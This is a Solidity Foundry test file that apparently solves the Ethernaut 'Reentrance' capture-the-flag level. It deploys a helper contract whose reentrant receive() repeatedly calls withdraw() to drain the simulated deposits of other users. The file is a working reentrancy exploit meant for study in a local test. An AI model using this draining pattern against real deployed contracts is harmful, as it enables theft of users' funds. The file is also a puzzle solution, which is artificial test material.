// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.12;

// Fix the following compiler error (specific to 0.6.x)
// Error: Unimplemented feature (/Users/distiller/project/libsolidity/codegen/CompilerUtils.cpp:420):Encoding type "struct StdInvariant.FuzzInterface memory[] memory" not yet implemented.
// UnimplementedFeatureError: Encoding type "struct StdInvariant.FuzzInterface memory[] memory" not yet implemented.
// - https://github.com/leovct/puzzl3s/issues/25
// - https://github.com/foundry-rs/foundry/issues/4376
pragma experimental ABIEncoderV2;

import '../../src/EthernautCTF/Reentrance.sol';
import '@openzeppelin-06/math/Math.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract Helper {
  Reentrance reentrance;

  constructor(address payable _targetAddress) public payable {
    reentrance = Reentrance(_targetAddress);
    reentrance.donate{value: 20 ether}(address(this));
    console2.log('Exploiter donated 20 ether');
  }

  function pwn() public {
    withdraw();
    console2.log('Exploiter withdrew all the funds');
  }

  receive() external payable {
    withdraw();
  }

  function withdraw() internal returns (bool) {
    uint256 helperBalance = reentrance.balances(address(this));
    uint256 reentranceBalance = address(reentrance).balance;
    uint256 amount = Math.min(helperBalance, reentranceBalance);
    if (amount != 0) {
      console2.log('Exploiter withdraws %d ether', amount / (1 ether));
      reentrance.withdraw(amount);
    }
  }
}

contract ReentranceExploit is Test {
  Reentrance target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');
  address alice = makeAddr('alice');
  address bob = makeAddr('bob');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Reentrance();
    console2.log('Target contract deployed');
    vm.stopPrank();
    vm.deal(exploiter, 100 ether);

    vm.startPrank(alice);
    vm.deal(alice, 100 ether);
    target.donate{value: 50 ether}(alice);
    assertEq(target.balances(alice), 50 ether);
    console2.log('Alice donated 50 ether');
    vm.stopPrank();

    vm.startPrank(bob);
    vm.deal(bob, 100 ether);
    target.donate{value: 100 ether}(bob);
    assertEq(target.balances(bob), 100 ether);
    console2.log('Bob donated 100 ether');
    vm.stopPrank();

    uint256 reentranceBalance = address(target).balance;
    console2.log(
      'Reentrance contract balance: %d ether',
      reentranceBalance / (1 ether)
    );
  }

  function testExploit() public {
    vm.startPrank(exploiter);
    Helper helper = new Helper{value: 20 ether}(address(target));
    console2.log('Helper contract deployed');
    assertEq(target.balances(address(helper)), 20 ether);

    // Withdraw all the funds.
    helper.pwn();
    vm.stopPrank();

    // Check the balances.
    uint256 reentranceBalance = address(target).balance;
    console2.log(
      'Reentrance contract balance: %d ether',
      reentranceBalance / (1 ether)
    );
    assertEq(reentranceBalance, 0);

    uint256 helperBalance = address(helper).balance;
    console2.log(
      'Helper contract balance: %d ether',
      helperBalance / (1 ether)
    );
    assertEq(helperBalance, 170 ether);
  }
}
